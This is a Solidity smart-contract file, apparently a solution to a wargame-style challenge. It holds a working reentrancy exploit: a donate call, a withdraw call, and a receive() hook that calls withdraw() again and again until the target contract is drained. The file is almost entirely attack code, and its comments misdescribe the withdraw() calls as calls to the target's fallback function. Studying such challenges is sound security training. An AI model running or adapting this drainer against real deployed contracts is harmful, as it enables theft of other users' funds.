// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
// import "hardhat/console.sol";

contract AttackingReentrance {
    Reentrance public reentrance;
    uint256 public initialDeposit;

    constructor(address payable _contractAddress) payable {
        reentrance = Reentrance(_contractAddress);
        initialDeposit = msg.value;
    }

    function hackContract() public payable {
        // Donate to the Reentrance contract to initiate the reentrancy attack
        reentrance.donate{value: initialDeposit}(address(this));

        // Trigger the reentrancy attack by calling the fallback function of the Reentrance contract
        reentrance.withdraw();
    }

    receive() external payable {
        // Trigger the reentrancy attack by calling the fallback function of the Reentrance contract
        if (address(reentrance).balance != 0) {
            reentrance.withdraw();
        }
    }
}